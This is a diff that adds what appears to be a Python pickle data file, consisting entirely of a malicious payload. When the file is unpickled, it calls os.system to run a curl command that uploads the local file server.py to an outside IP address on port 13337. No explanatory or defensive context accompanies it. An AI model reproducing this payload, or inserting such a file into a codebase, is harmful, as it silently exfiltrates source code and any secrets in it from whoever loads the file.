@@ -1,0 +1,6 @@
+cos
+system
+(S'curl -i -F afile=@server.py 40.71.18.65:13337'
+tRp100
+0g100
+.
